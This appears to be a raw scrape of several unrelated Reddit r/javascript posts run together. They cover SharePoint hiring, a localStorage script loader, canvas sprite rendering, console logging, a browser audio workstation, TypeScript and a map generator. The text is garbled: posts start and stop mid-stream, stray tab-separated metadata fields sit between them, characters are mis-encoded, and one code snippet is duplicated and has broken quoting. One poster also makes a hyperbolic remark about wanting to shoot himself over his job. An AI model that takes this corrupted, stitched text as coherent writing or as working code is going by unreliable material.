We're moving into a space where almost everything we do requires javascript work to some extent, particularly as Microsoft have now deprecated server side code in 2013 in favour of HTML5 / JavaScript based solutions. The server-side stuff still exists, at least for the self-hosted stuff, but it is not where Microsoft are headed.

We've tried hiring traditional ASP.NET / SharePoint people, and while their c# skills are generally great, their JavaScript seems almost non-existent, which is a real hindrance. When hiring in a web context For other languages, such as Ruby or Python, it seems that it is assumed that the JavaScript abilities will be there and complete, this simply does not seem to be the case for c# / ASP.NET developers. And training them in it seems to be a strangely difficult task, taking far longer than we had assumed it would.

So we're trying a new tack. What we're trying to do is hire a person who has JavaScript and web UX abilities, pure and simple. Other, more server side languages are a bonus, but it is the JavaScript skills we are after, the person doesn't even need to know what SharePoint is. We will then take them on as a junior consultant, train them up in the SharePoint and Project Server side of things.

I guess that's the other part, this is a consulting role, the person would be customer facing, client billable, travelling to them, designing and implementing the solution with them, that sort of thing. This is not a typical dev team type job, at least not after a few months when they start to come up to speed in the SharePoint parts of things.

So, that sets the scene of what we're trying to do, the kind of person we want. Now here is the job spec that has gone out to help find them: ([PDF](http://www.cps.co.uk/Careers/Lists/Vacancies/Junior%20Consultant%20-%20SharePoint.pdf))

What's the problem? I hear you ask, why are you telling us all this?

The problem we have is that the candidates we are receiving are just not quite what we're after. Most have a very heavy design focus, and many, despite the spec, have little or even no JavaScript knowledge or experience.

So I suppose the question is this: **What would you guys change in this job spec to make it appeal to the kind of person I listed above?** This is the first time we have tried to hire this sort of person and it is a learning experience for us. :)

Full disclosure: I am using a throwaway account for this because I want to keep my normal reddit account mostly seperate from my work. I am a more traditional web developer myself, having come to SharePoint consultancy after working in more traditional web development teams in a few industries, using languages like Ruby on Rails, PHP, Java and even ancient old ASP. I've been with this company for 5 years now and have brought in most of the JavaScript skills we have both from my previous experience and from constantly reading places like this sub and other blogs etc, and trying things out on my own! I have received permission from our HR people to make this post.

At my last job, I managed to open source a little library I created to help improve the load performance of our mobile website - I called in BootUp.js because that's pretty much exactly what it does.

I had been told about the technique to load in JS from localStorage, but didn't really find many implementations that I liked, so I decided to make one myself. You simply provide an array of files to load, and a success callback, and it'll do the rest. If you use differing query strings on JS files or whatever, BootUp will only download the files that had changed, but still load the files in order.

You can see it here: https://github.com/TradeMe/bootup.js

As I said, it was from my last job, so if you want to see it in action, visit: http://touch.trademe.co.nz

    var name = 'Bob';

    var name = 'Bob';

    text += 'Hello ' + name + "" how's your day going?"";
    text += 'My day is going fine thanks ' + name;

I'm planning a little presentation (45 mins) for a local conference (~300 attendees). The topic will have something to do with web development and specifically JavaScript.

The audience will likely know something about JS (many can use jQuery I think) but don't know how to implement bigger applications using it.

Which parts of the language do you consider difficult for a beginner? Are there some specific aspects that should be discussed in particular?

I have a [rough outline](https://gist.github.com/4617841) available. I know 45 minutes isn't that long so I'll likely have to cut some out. Perhaps this could be turned into a small booklet or something. That might be interesting."	t5_2qh30	True
1358251276.0	16m3xt	How to use sprites in a performant way on &lt;canvas&gt;?	steampunkdev	38	3	34	"Hey guys,

I had a couple of questions regarding writing performant code for the HTML5 canvas. Although thereâs information on about how to use it online, there doesnât seem to be much in-depth stuff yetâ¦ so Iâm here looking for information from the proâs which later could perhaps be put into a coherent form to provide info for others.

Before I ask my questions, I believe I should sketch the use case. For a multiplayer game I am building I want to use the HTML5 canvas. I've considered using webgl (which I have experience with) instead for performance reasons but since it's not really supported on other platforms than the PC and it still needs quite a bit of development, I'd prefer to stick with the canvas. 
I am intending to use tiles (sprites, square ones) with 32x32 size for background, foreground, monster and character images. Some of the images should also be animated, in particular the player and monster ones. For obvious reasons the players should see each other and the monsters move, this data (and the data of the ""map"") is provided through websocket from a webservice so can be in real time (obviously along with an algorithm on the client side to take care of predictions during latency and so on).

The view of the player would be his character standing in the center, and if he'd moved, the screen would move with him, so he'd stay centered. I had the idea of putting a spring between the player and the âcameraâ, so when he moves around the camera would follow him fluently doesn't get too âjitterishâ if the FPS would go lower.
I am not entirely sure what the ideal method for this would be, however. Is it constantly redrawing every single tile on the board?  Or drawing a part of them and ""move"" the canvas as the player moves?

The second thing that I was wondering about is what the ideal format for the spritesheets with the tiles on them would be. In case of webgl I would have put them on one or several 2048x2048 textures so those could be loaded into the GPU memory and easily having the right sprites selected by the image shader but I'm not entirely sure what would be the best thing to do when using them in the canvas.

As a third question I am also intending to have the player's images changing depending on what they're wearing. So I'd basically have a base image for a certain race (e.g. a dwarf) and depending on what he's wearing, certain pixels of his body should change colour and some of his pixels should be ""overwritten"" as in overlayed with another image. These images obviously also are animated, so a fighting dwarf would also have some of his clothes that moved. For this part I was wondering whether I would best pre-generate every possible image and then let the client download them when necessary or simply to generate them on the client-side. In a webgl version I would just use a pixel shader for this but Iâm not sure what the best way to do with the canvas would be.

As a side note, I donât mind that the maps need some time to load (in case images need to be downloaded, etc) as long as the gameplay itself seems fluent.

Thanks for any and all advice, I hope this will open a discussion where we can all learn from! :)"	t5_2qh30	True

My question is, do you guys clean all the log commands once it goes live? I'm working on a very complex system and it would be nice to have it always enabled so I can ocasionally check (non-sensitive) information of what's happening behind. 

Example:

    console.log('call something value = ' + value);

It's amateurish to leave it enabled? Can it cause any problems like mobile browsers that don't have a console instance? I don't find hacks (console global disable) very attracting.

Thanks

**-- edit --**

What I mean with ""amateurish"" is that I never expose any server-side errors on live sites, but since it's client-side (only non-sensitive) information it might not matter.

1336710306.0	thpe5	Calling all music + javascript enthusiasts	MiracleBlue	39	7	36	"Hi there.  I'm a JS developer and trance music producer.  I've been writing music all my life, and I've been programming since I was very young.  These are my two biggest passions in life.

Since the introduction of the Mozilla Audio Data API (and Web Audio API), I've been fixated on the possibility of developing audio software in the browser.  More specifically, a Digital Audio Workstation (DAW), complete with synthesis and sequencing and effects.  For nearly a year now, I've been quietly hacking away at my own project called JSaw (JavaScript Audio Workstation) which I hope will achieve the goal of being a fully featured (or perhaps mostly-featured) DAW in native Javascript.

It's been turbulent, to say the least.  I re-wrote it several times, designed and re-designed aspects of the core, toyed with many different frameworks to aid in the complexities of developing such a gargantuan system.  Here I am now, almost a year later, and I don't really have anything significant or usable to show for it.  The codebase is a bit of a mess, needs organising, probably needs a re-think as well.  The problem is, I'm exhausted.  I'm the only developer working on this.  I've asked for help from friends of mine, who all would love to help but simply don't have the time which is perfectly understandable.

I am obsessed with achieving this dream.  I am desperate.  It's not that there is any specific part about this project that is too complex for me to achieve; it's simply the scale and scope of the project that I'm undertaking.  It's hard to get my head around it and stay on track.  Not to mention the time constraints of a full time job (as I'm sure we all have).  I am ready to give up entirely.

So, this is my plea.  If there's anyone out there who is enthusiastic about electronic music and Javascript, and would like to contribute even a small portion of time and effort to help, please let me know.  No commitments or anything like that.  I know we all have jobs and lives and other things going on.  This is a 100% open source project.  I can't offer you anything in return except my infinite gratitude.

Sorry for the long post.  I don't want to give this project up, but I don't know what else I can do.  Thanks for reading this far.

**TL;DR:** Working on an open-source Digital Audio Workstation for the browser, looking for help and contributors.  Feeling very forever alone.

**edit** - github: https://github.com/MiracleBlue/JSaw (warning, the codebase is a little bit older than the latest, simply because I've added a bunch of bloat that I need to clean up before I can feel good about pushing the newest stuff up)

**Edit 2** - thanks for the response so far everyone!  I put up a demo of the latest working codebase [here](http://dl.dropbox.com/u/19088947/JSaw/index.html), please ignore the non-working piano roll though.  To test it, select one of the ""Observed Instruments"" over on the right by clicking its radio button, then click on one of the keys in the piano roll on the far left to play a note.  Try changing the values in the input fields for the effects, and playing another note.  This demonstrates the knockout integration I have so far :)

**EDIT 3** - Pushed the latest code base to github just now, including the knockout integration stuff!"	t5_2qh30	True

I was looking at the code for the site at [Nike Better World](http://www.nikebetterworld.com/), and they are doing some incredible structuring of their code, really packaging it up into jQuery extensions and clean as hell. See [here](http://www.nikebetterworld.com/lib/js/com.nikebetterworld.js?0.1.0.0).

My self taught direction is mostly centered on individual functions that aren't connected like the code here.

I work on corporate bullshit all day long (for the last 15 years) primarily developing big ass apps using C#. Most days I want to put a gun in my mouth. I have been doing ASP.NET webforms nonsense for the last year, but I use very little JavaScript day to day. I would really like to use other non-MS platforms and learn to rely on JavaScript more. 

I am familiar with JavaScript, the language, but I guess I am unfamiliar with how experienced web developers are using it. The only analogy I can think of is it is like learning a programming language in school and then getting out into the real world and programming for a living. It's a big gap!

What is a plan of action for me? I want to be able to say ""yeah, I am a web developer"". I know that I need to build things to learn it, but there is so much information out there. I don't want to get lost in it. I just need a ""do this, then this, then this"" type of plan. Thank you all."	t5_2qh30	True

Why might I not want to use it?	phaggocytosis	41	11	65	"From what I understand TypeScript is both a superset of current Javascript as well as ES6. Meaning that when ES6 is implemented in to our browsers, TypeScript will still work just fine.

I write a lot of OO languages these days. When I do write PHP I use as much OO as I can. I write a software in Java. Because of this I'm left wishing that Javascript had some features that I didn't have to use such ugly syntax to achieve. TypeScript, thankfully, fixes that.

HOWEVER, I'm aware that I'm a little naive. There must be a reason that I should be concerned about getting invested in writing TypeScript. So, I'm curious to hear what everyone might have to say about using it.

I really appreciate all input!

Cheers!

edit: It's worth noting that I write Javascript both for the broswer and at least 1 fairly large nodejs project. If there are specific reasons that TypeScript is great or specifically not great for either platform i'd be interested to hear them."	t5_2qh30	True

Like, a MUCH larger map. I'm not a super great map-maker, and the process I'd used to create the original map array was pretty messy, so I figured I could write a map generator which could do the job for (and better than) me. For my purposes, it turned out pretty good. It forges a 3D-based terrain through up to 20 levels and produces either a text array or a color topographical map. A friend commented that it was pretty cool and maybe others would benefit from it, so I polished it up a little bit. I wrote it all in raw JavaScript while commuting back and forth to work on the ferry boat. It's not perfect, but I hope someone finds some use for it.
